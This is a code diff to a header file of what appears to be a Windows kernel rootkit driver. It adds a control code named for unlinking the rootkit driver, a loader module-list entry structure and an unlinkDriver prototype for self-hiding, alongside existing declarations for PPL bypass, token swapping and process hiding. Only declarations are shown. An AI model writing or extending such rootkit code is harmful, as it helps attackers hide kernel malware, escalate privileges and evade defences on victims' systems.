@@ -36,6 +36,7 @@
 #define IOCTL_PPL_BYPASS CTL_CODE_HIDE(12)
 #define IOCTL_PROC_TOKEN_SWAP CTL_CODE_HIDE(13)
 #define IOCTL_UMPROC_HIDE CTL_CODE_HIDE(14)
+#define IOCTL_UNLINK_ROOTKIT_DRV CTL_CODE_HIDE(15)
 
 
 
@@ -114,6 +115,41 @@ typedef struct OB_CALLBACK_ENTRY_t {
     KSPIN_LOCK Lock;                         // Synchronization mechanism
 } OB_CALLBACK_ENTRY, * POB_CALLBACK_ENTRY;
 
+typedef struct _MODULE_ENTRY
+{
+    LIST_ENTRY InLoadOrderLinks;			// the load order list 
+    LIST_ENTRY InMemoryOrderLinks;			// the memory order list
+    LIST_ENTRY InInitializationOrderLinks;	// the initialization order list.
+    PVOID ModuleBase;
+    PVOID EntryPoint;
+    ULONG ModuleSize;
+    UNICODE_STRING FullModuleName;
+    UNICODE_STRING BaseModuleName;
+    ULONG ModuleFlags;
+    USHORT LoadCount;
+    USHORT TlsIndex;
+    union
+    {
+        LIST_ENTRY HashLinks;
+        struct
+        {
+            PVOID SectionPointer;
+            ULONG CheckSum;
+        } RandomStructname1;
+    };
+    union
+    {
+        ULONG TimeDateStamp;
+        PVOID LoadedImports;
+    };
+    struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
+    PVOID PatchInformation;
+    LIST_ENTRY ForwarderLinks;
+    LIST_ENTRY ServiceTagLinks;
+    LIST_ENTRY StaticLinks;
+} MODULE_ENTRY, * PMODULE_ENTRY;
+
+
 typedef enum _DCMB_CALLBACK_TYPE {
     ProcessObjectCreationCallback,
     ThreadObjectCreationCallback,
@@ -157,6 +193,7 @@ NTSTATUS procTokenSwap(DWORD, DWORD, int);
 NTSTATUS TermProcess(ULONG_PTR);
 NTSTATUS crashProcess(ULONG_PTR);
 NTSTATUS procHiding(DWORD, DWORD);
+NTSTATUS unlinkDriver(PDRIVER_OBJECT);
 
 #ifndef SystemModuleInformation
 #define SystemModuleInformation 0xB
